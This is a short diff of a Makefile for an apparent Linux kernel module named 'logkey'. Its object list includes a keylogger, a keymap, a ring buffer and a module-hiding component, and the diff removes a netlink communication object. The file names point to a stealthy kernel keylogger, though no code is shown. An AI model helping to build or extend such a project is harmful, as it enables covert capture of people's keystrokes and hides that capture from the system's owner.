@@ -5,7 +5,6 @@ logkey-objs := \
 	src/hide_module.o \
 	src/keylogger.o \
 	src/keymap.o \
-	src/netlink_comm.o \
 	src/ringbuf.o \
 	src/main.o
 
